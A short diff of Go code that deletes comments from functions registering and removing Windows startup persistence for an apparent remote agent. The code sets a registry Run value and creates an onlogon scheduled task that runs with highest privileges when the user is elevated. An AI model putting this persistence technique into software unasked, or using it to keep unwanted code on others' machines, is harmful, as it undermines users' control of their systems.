@@ -41,9 +41,7 @@ func registerStartup(target string, branding PersistenceBranding) error {
 		return fmt.Errorf("set run value: %w", err)
 	}
 
-	// Also register as a scheduled task for better persistence
 	if err := registerScheduledTask(target, valueName); err != nil {
-		// Log but don't fail, as registry run might still work
 		fmt.Fprintf(os.Stderr, "Warning: failed to register scheduled task: %v\n", err)
 	}
 
@@ -51,7 +49,6 @@ func registerStartup(target string, branding PersistenceBranding) error {
 }
 
 func registerScheduledTask(target, name string) error {
-	// schtasks /create /tn "Name" /tr "path" /sc onlogon /rl highest /f
 	args := []string{"/create", "/tn", name, "/tr", fmt.Sprintf("\"%s\"", target), "/sc", "onlogon", "/f"}
 	if platform.CurrentUserIsElevated() {
 		args = append(args, "/rl", "highest")
@@ -92,7 +89,6 @@ func unregisterStartup(branding PersistenceBranding) error {
 		key.Close()
 	}
 
-	// Also remove scheduled task
 	valueName := strings.TrimSpace(branding.RunKeyName)
 	if valueName == "" {
 		valueName = "TenvyAgent"
